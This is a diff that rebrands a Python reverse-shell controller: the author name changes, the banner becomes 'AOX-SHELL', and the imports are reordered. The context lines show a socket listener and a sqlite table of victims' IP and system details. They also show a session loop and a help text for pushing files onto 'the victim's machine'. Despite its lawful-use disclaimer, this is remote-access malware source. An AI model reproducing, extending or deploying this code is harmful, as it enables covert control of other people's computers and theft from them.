@@ -1,27 +1,29 @@
-#Created by Xand
+# Created by Vasto Boy
 
-#Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
+# Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
 
 
-import socket
+
 import os
 import re
-from time import gmtime, strftime
 import time
-import threading
+import socket
 import sqlite3
+import threading
+from time import gmtime, strftime
 from prettytable import from_db_cursor
 
+
+
 art = """
-      /$$$$$$                                                   
-     /$$__  $$                                                  
-    | $$  \__/  /$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
-    | $$       /$$__  $$ /$$__  $$ /$$__  $$| $$__  $$ |____  $$
-    | $$      | $$  \ $$| $$  \__/| $$  \ $$| $$  \ $$  /$$$$$$$
-    | $$    $$| $$  | $$| $$      | $$  | $$| $$  | $$ /$$__  $$
-    |  $$$$$$/|  $$$$$$/| $$      |  $$$$$$/| $$  | $$|  $$$$$$$
-     \______/  \______/ |__/       \______/ |__/  |__/ \_______/
+     █████╗  ██████╗ ██╗  ██╗     ███████╗██╗  ██╗███████╗██╗     ██╗     
+    ██╔══██╗██╔═══██╗╚██╗██╔╝     ██╔════╝██║  ██║██╔════╝██║     ██║     
+    ███████║██║   ██║ ╚███╔╝█████╗███████╗███████║█████╗  ██║     ██║     
+    ██╔══██║██║   ██║ ██╔██╗╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
+    ██║  ██║╚██████╔╝██╔╝ ██╗     ███████║██║  ██║███████╗███████╗███████╗
+    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
 """
+
 
 print(art)
 
@@ -41,9 +43,12 @@ user_guide = """
             'send (filename or path)':['send file from server and stores it on the victim's machine']
 """
 
+
+
 client_conn_object = []
 client_conn_object.append("")
 image_counter = 0
+
 
 #create socket and listen for connection
 def create_socket():
@@ -104,6 +109,7 @@ def store_client_info(client_database_conn, ip, conn, client_sysinfo_list):
    cursor.execute("INSERT INTO connectedClients(IP_Address, System, Node_Name, Release, Version, Machine, Processor) VALUES(?, ?, ?, ?, ?, ?, ?)", (ip, str(client_sysinfo_list[0]), str(client_sysinfo_list[1]), str(client_sysinfo_list[2]), str(client_sysinfo_list[3]), str(client_sysinfo_list[4]), str(client_sysinfo_list[5])))
    client_database_conn.commit()#commints changed
 
+
 #retrive and display all client information in the database
 def get_client_info(client_database_conn):
     cursor = client_database_conn.cursor()
@@ -119,6 +125,7 @@ def get_client_info(client_database_conn):
     cursor.execute("SELECT * FROM connectedClients")#retrive all client information in the database
     connected_client = from_db_cursor(cursor)#insert retrived client information into a table
     print(connected_client)
+
 
 #formats client info in the right order to be saved in the database
 def format_client_info(client_info):
@@ -282,6 +289,7 @@ def client_session(client_conn):
             except:
                 print("[-]Connection terminated!!!")
                 break
+
 
 
 def main():
